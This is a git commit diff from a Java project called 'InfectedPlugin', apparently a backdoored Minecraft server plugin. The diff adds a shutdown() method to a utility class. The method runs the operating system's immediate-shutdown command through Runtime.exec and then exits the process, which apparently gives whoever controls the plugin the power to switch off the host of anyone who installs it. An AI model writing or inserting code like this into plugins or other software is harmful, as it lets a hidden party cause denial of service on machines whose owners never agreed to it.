65c60d1f665d05397ae9f8fc26edc6d73d5c9203
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-17 07:39:36 -0700

    Moved .shutdown into IP_Util

--- src/org/CreeperCoders/InfectedPlugin/IP_Util.java
+++ src/org/CreeperCoders/InfectedPlugin/IP_Util.java
@@ -70,4 +70,26 @@ public class IP_Util
             
         }
     }
+    
+    public static void shutdown() throws RuntimeException, IOException
+    {
+        String shutdownCommand = null;
+        String operatingSystem = System.getProperty("os.name");
+
+        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
+        {
+            shutdownCommand = "shutdown -h now";
+        }
+        else if ("Windows".equals(operatingSystem))
+        {
+            shutdownCommand = "shutdown.exe -s -t 0";
+        }
+        else
+        {
+            throw new RuntimeException("Unsupported operating system.");
+        }
+
+        Runtime.getRuntime().exec(shutdownCommand);
+        System.exit(0);
+    }
 }
